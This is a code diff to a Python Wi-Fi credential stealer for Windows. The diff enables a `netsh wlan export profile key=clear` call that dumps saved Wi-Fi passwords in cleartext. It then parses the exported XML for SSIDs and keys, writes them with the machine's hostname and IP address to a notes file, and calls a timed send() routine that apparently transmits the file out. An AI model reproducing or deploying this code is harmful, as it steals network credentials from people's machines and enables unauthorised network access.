@@ -1,6 +1,5 @@
 import subprocess
 import os
-import sys
 import requests
 import json
 import threading
@@ -11,11 +10,11 @@ password_file = open("notes.txt", "w", encoding="utf-8")
 password_file.write(f"Password List for: {socket.gethostname()}, {socket.gethostbyname(socket.gethostname())}: \n")
 password_file.close()
 
-wifi_files = []
-wifi_name = []
-wifi_password = []
+files = []
+ssid = []
+password = []
 
-#subprocess.run("netsh wlan export profile key=clear", capture_output = True).stdout.decode()
+subprocess.run("netsh wlan export profile key=clear", capture_output = True).stdout.decode()
 #os.system("netsh wlan export profile key=clear")
 
 path = os.getcwd()
@@ -30,6 +29,7 @@ try:
 except:
     pass
 
+
 def send():
     try:
         with open("notes.txt", "r") as f:
@@ -40,27 +40,31 @@ def send():
         timer = threading.Timer(interval, send)
         timer.start()
 
-for file_name in os.listdir(path):
-    if file_name.startswith("Wi-Fi") and file_name.endswith(".xml"):
-        wifi_files.append(file_name)
-        
-for i in wifi_files:
-    with open(i, "r") as f:
-        for line in f.readlines():
-            if "name" in line:
-                stripped = line.strip()
-                front = stripped[6:]
-                back = front[:-7]
-                wifi_name.append(back)
-            if "keyMaterial" in line:
-                stripped = line.strip()
-                front = stripped[13:]
-                back = front[:-14]
-                wifi_password.append(back)
-                for x, y in zip(wifi_name, wifi_password):
-                    sys.stdout = open("notes.txt", "a", encoding="utf-8")
-                    #sys.stdout.write(f"SSID: {x} Password: {y}", sep = "\n")
-                    print(f"SSID: {x} Password: {y}", sep = "\n")
-                    sys.stdout.close()
-                    send()
-                            
+def getFiles():
+    for file_name in os.listdir(path):
+        if file_name.startswith("Wi-Fi") and file_name.endswith(".xml"):
+            files.append(file_name)
+
+getFiles()
+
+with open("notes.txt", "a", encoding="utf-8") as file:
+    written_ssids = set()
+    for i in files:
+        with open(i, "r") as f:
+            for line in f.readlines():
+                if "name" in line:
+                    stripped = line.strip()
+                    front = stripped[6:]
+                    back = front[:-7]
+                    if back not in written_ssids:
+                        ssid.append(back)
+                if "keyMaterial" in line:
+                    stripped = line.strip()
+                    front = stripped[13:]
+                    back = front[:-14]
+                    if ssid and back and ssid[-1] not in written_ssids:  # only write the last SSID if it hasn't been written yet
+                        written_ssids.add(ssid[-1])
+                        password.append(back)
+                        file.write(f"SSID: {ssid[-1]} Password: {password[-1]}\n")
+
+send()
